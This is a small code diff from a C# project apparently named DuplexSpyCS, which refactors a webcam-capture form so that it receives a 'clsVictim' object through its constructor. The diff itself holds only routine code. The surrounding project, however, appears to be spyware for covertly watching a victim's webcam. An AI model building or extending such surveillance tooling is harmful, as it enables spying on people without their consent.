@@ -15,7 +15,7 @@ namespace DuplexSpyCS
 {
     public partial class frmWebcam : Form
     {
-        public clsVictim v;
+        public clsVictim v { get; set; }
         private bool capture = false;
 
         //FPS
@@ -29,9 +29,11 @@ namespace DuplexSpyCS
         private SemaphoreSlim fileLock;
         private bool isProcessing = false;
 
-        public frmWebcam()
+        public frmWebcam(clsVictim v)
         {
             InitializeComponent();
+
+            this.v = v;
         }
 
         private void UpdateDelay(int nDelay)
